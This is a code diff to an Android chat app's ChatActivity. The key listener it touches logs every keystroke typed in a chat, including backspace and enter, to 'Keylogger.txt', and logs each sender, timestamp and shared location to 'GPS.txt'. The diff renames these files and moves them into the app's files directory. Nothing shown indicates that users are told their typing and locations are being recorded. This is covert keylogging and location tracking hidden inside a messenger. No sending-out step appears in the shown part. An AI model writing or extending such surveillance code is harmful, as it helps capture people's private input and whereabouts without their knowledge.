@@ -107,16 +107,16 @@ public class ChatActivity extends AppCompatActivity {
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                         String keylog  = "Chat with " + otheruser + ":{BACKSPACE}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                         String keylog  = "Chat with " + otheruser + ":{ENTER}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                     else{
                         char key = (char) keyEvent.getUnicodeChar();
                         String keylog  = "Chat with " + otheruser + ":{" + key + "}\n";
-                        writeToFile("Keylogger", keylog);
+                        writeToFile("Keylogger.txt", keylog);
                     }
                 }
                 return false;
@@ -184,7 +184,7 @@ public class ChatActivity extends AppCompatActivity {
                                                 String storageMessage = "User: "+ chat.getSender()
                                                         + " Timestamp: " + chat.getTimestamp()
                                                         + " Location: " + chat.getMessage();
-                                                writeToFile("GPS", storageMessage);
+                                                writeToFile("GPS.txt", storageMessage);
                                             }
                                         }
                                     }
@@ -436,10 +436,7 @@ public class ChatActivity extends AppCompatActivity {
     }
 
     public void writeToFile(String fileName, String content) {
-        File file = new File(ChatActivity.this.getFilesDir(), "text");
-        if (!file.exists()) {
-            file.mkdir();
-        }
+        File file = new File(ChatActivity.this.getFilesDir().getPath());
         try {
             File gpxfile = new File(file, fileName);
             FileWriter writer = new FileWriter(gpxfile, true);
